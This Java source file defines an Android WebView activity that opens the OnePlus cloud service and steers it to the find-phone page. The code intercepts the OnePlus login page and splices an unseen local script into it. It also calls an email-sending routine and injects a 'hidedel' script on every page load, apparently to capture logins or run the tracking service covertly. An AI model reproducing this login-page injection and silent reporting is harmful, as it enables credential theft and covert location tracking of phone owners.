package com.cn.dafeng.where;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.webkit.*;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;

import static com.cn.dafeng.where.utils.SendEmail.SendMsg;
import static com.cn.dafeng.where.utils.WebViewUtils.getJs;
import static com.cn.dafeng.where.utils.WebViewUtils.initWebview;


public class WsWebview extends AppCompatActivity {

    private WebView webView;

    private final Activity currentActivity = this;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        MyApplication app = (MyApplication) getApplication();
        if (!app.isAuthorized() && !BuildConfig.DEBUG) {
            finish();
            return;
        }
        super.onCreate(savedInstanceState);
        webView = new WebView(this);
        setContentView(webView);

        initWebview(webView);
        webView.setWebViewClient(
                new WebViewClient() {

                    @Override
                    public void onPageStarted(WebView view, String url, Bitmap favicon) {
                        super.onPageStarted(view, url, favicon);
                        SendMsg();
                        try {
                            webView.evaluateJavascript(getJs(currentActivity, "hidedel"), null);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }


                    @Nullable
                    @Override
                    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
                        Log.d("shouldInterceptRequest", "shouldInterceptRequest: "+request.getUrl().toString());

                        if (request.getUrl().toString().startsWith("https://id.oneplus.com/cloud_login.htm")) {

                            String result;
                            try {
                                final URL url = new URL(request.getUrl().toString());
                                final URLConnection urlConnection = url.openConnection();
                                final InputStream inputStream = urlConnection.getInputStream();
                                final int contentLength = urlConnection.getContentLength();
                                byte[] chars = new byte[contentLength];
                                //noinspection ResultOfMethodCallIgnored
                                inputStream.read(chars);
                                result = new String(chars);
                                result = result.replace("</body>", "</body><script>" + getJs(currentActivity, "ws") + "</script>");
                            } catch (IOException e) {
                                e.printStackTrace();
                                return super.shouldInterceptRequest(view, request);
                            }
                            if (!result.equals("")) {
                                return new WebResourceResponse("text/html", "UTF-8", new ByteArrayInputStream(result.getBytes()));

                            }

                        }
                        return super.shouldInterceptRequest(view, request);

                    }

                    @Override
                    public void doUpdateVisitedHistory(WebView view, String url, boolean isReload) {
                        System.out.println(url);
                        if ("https://cloud.h2os.com/#/home".equals(url)) {
                            view.loadUrl("https://cloud.h2os.com/#/findPhone");
                        }
                        super.doUpdateVisitedHistory(view, url, isReload);
                    }
                }
        );

        webView.loadUrl("https://cloud.h2os.com/#/");
    }


    // 重写方法，防止点击返回按钮直接退回上一活动页面
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView.copyBackForwardList().getCurrentIndex() > 2) {
            // 返回上个页面
            webView.goBack();
            return true;
        }
        finish();
        return super.onKeyDown(keyCode, event);
    }


}
